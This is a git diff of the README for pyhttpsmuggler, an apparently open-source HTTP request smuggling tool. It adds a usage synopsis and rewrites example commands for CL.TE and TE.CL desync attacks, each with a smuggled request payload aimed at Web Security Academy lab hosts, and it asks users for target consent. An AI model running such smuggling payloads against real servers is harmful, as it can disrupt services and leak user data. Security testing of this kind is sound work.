@@ -1,4 +1,12 @@
 # pyhttpsmuggler
+`
+usage: ./pysmuggle [-h | --help] [--host [HOST]] [--port [PORT]] [--ngrok [NGROK]] [--method [METHOD]] 
+[--endpoint [ENDPOINT]] [--http-version [HTTP_VERSION]] [--request-headers [REQUEST_HEADERS]] [--debug [DEBUG]]
+[--special-formatting [SPECIAL_FORMATTING]] [--body-data [BODY_DATA]] [--body-length [BODY_LENGTH]] 
+[--smuggled-body-fields [SMUGGLED_BODY_FIELDS]] [--use-ssl [USE_SSL]]
+[--custom-body-payload [CUSTOM_BODY_PAYLOAD]] [--prefix [PREFIX]]
+`
+
 Scripts related to web/request smuggling & general web hacking.
 *This project is free to use and modify. The three things I ask of those interested in using/modifying/distributing this project is:
 1. Users have the explicit consent from target host servers' maintainers to test for vulnerabilities-- as a successful exploit may disrupt web-services and/or leak sensitive user-data.
@@ -12,11 +20,11 @@ Scripts related to web/request smuggling & general web hacking.
 ### CL.TE Vulnerability
 
 ```python
-python3 pysmuggle.py --host "your-access-token.web-security-academy.net" --method "POST" --body-length "35" --body-data ""  --smuggled-body-fields "GET /404 HTTP/1.1,X-Ignore: X" --debug "1"
+./pysmuggle --host "your-access-token.web-security-academy.net" --method "POST" --body-length "35" --body-data ""  --smuggled-body-fields "GET /404 HTTP/1.1,X-Ignore: X" --debug "1"
 ```
 ### TE.CL Vulnerability
 ```python
-python3 pysmuggle.py --host "your-access-token.web-security-academy.net" --method "POST" --body-length "4" --body-data "5c" --smuggled-body-fields "GPOST / HTTP/1.1,Content-Type: application/x-www-form-urlencoded,Content-Length: 15,,x=1,0," --debug "1"
+./pysmuggle --host "your-access-token.web-security-academy.net" --method "POST" --body-length "4" --body-data "5c" --smuggled-body-fields "GPOST / HTTP/1.1,Content-Type: application/x-www-form-urlencoded,Content-Length: 15,,x=1,0," --debug "1"
 ```
 ## Changelog
 ### 9/4/2021
